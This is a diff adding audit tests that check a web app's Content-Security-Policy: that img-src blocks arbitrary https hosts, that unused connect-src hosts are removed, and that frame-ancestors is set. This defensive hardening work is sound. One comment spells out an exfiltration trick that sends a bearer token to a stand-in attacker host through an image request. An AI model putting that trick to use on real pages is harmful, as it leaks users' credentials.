@@ -53,6 +53,70 @@ describe('Content-Security-Policy hardening (re-audit, M-7)', () => {
   // The mechanic to remember: in a YAML folded scalar, a line indented MORE than the
   // block's first line is kept literally AND its newline is preserved. Every
   // continuation line of the CSP value must sit at the same indent.
+  // ── AUDIT M8 (second launch audit, Sep 2026) ──────────────────────────────
+  describe('M8 — the policy grants nothing it does not use', () => {
+    // Reuse the H12 parser below rather than maintain a second, weaker one: it walks
+    // the folded block by indent, which is what actually defines the block's extent.
+    const csp = () => {
+      const lines = yml.split('\n')
+      const at = lines.findIndex((l) => /^\s*-\s*key:\s*Content-Security-Policy\s*$/.test(l))
+      const body = []
+      let baseIndent = null
+      for (let i = at + 2; i < lines.length; i++) {
+        const line = lines[i]
+        if (line.trim() === '') break
+        const indent = line.length - line.trimStart().length
+        if (baseIndent === null) baseIndent = indent
+        if (indent < baseIndent || /^\s*-\s*key:/.test(line)) break
+        body.push(line.trim())
+      }
+      return body.join(' ')
+    }
+
+    it('img-src no longer permits arbitrary https hosts', () => {
+      // `img-src https:` is an open exfiltration channel: new Image().src =
+      // 'https://attacker/' + token needs no fetch and no CORS. That is the exfil half
+      // of H5, whose bearer token is readable from page JavaScript.
+      const directive = csp().match(/img-src[^;]*/)[0]
+      expect(directive).not.toMatch(/(^|\s)https:(\s|$)/)
+      expect(directive).toMatch(/'self'/)
+      expect(directive).toMatch(/data:/)
+      expect(directive).toMatch(/blob:/)
+      // The Meta pixel's beacon is the one external image the product actually loads.
+      expect(directive).toContain('https://www.facebook.com')
+    })
+
+    it('connect-src lists no host without a code path', () => {
+      // Each of these lost its caller: provider OAuth moved server-side, and the
+      // web3forms key moved behind POST /alerts/form-relay (integrations.js, OBS-5).
+      const directive = csp().match(/connect-src[^;]*/)[0]
+      for (const dead of [
+        'quickbooks.api.intuit.com', 'api.xero.com', 'api.wave.com',
+        'api.freshbooks.com', 'api.web3forms.com',
+      ]) {
+        expect(directive, `${dead} has no remaining code path`).not.toContain(dead)
+      }
+    })
+
+    it('connect-src still lists every host that IS used', () => {
+      // The failure mode in the other direction — over-pruning breaks the product.
+      const directive = csp().match(/connect-src[^;]*/)[0]
+      for (const live of [
+        "'self'", 'https://app.taxstat360.com', 'https://api.stripe.com',
+        'https://taxstat360.us4.list-manage.com', 'https://www.facebook.com',
+      ]) {
+        expect(directive, `${live} is still in use`).toContain(live)
+      }
+    })
+
+    it('frame-ancestors is present alongside X-Frame-Options', () => {
+      // X-Frame-Options: DENY covers legacy browsers; frame-ancestors is what modern
+      // browsers actually honour, and it was absent entirely.
+      expect(csp()).toMatch(/frame-ancestors 'none'/)
+      expect(yml).toMatch(/X-Frame-Options[\s\S]{0,40}DENY/)
+    })
+  })
+
   describe('H12 — the folded CSP value must fold to a single line', () => {
     // Parse the folded block by hand rather than adding a YAML dependency: read from the
     // `value: >-` marker to the next key at the same or lower indent.
@@ -103,6 +167,7 @@ describe('Content-Security-Policy hardening (re-audit, M-7)', () => {
         'default-src', 'script-src', 'style-src', 'font-src', 'img-src',
         'connect-src', 'frame-src', 'worker-src', 'object-src', 'base-uri',
         'form-action', 'upgrade-insecure-requests',
+        'frame-ancestors',   // AUDIT M8 (Sep 2026)
       ]) {
         expect(folded, `missing directive: ${d}`).toContain(d)
       }
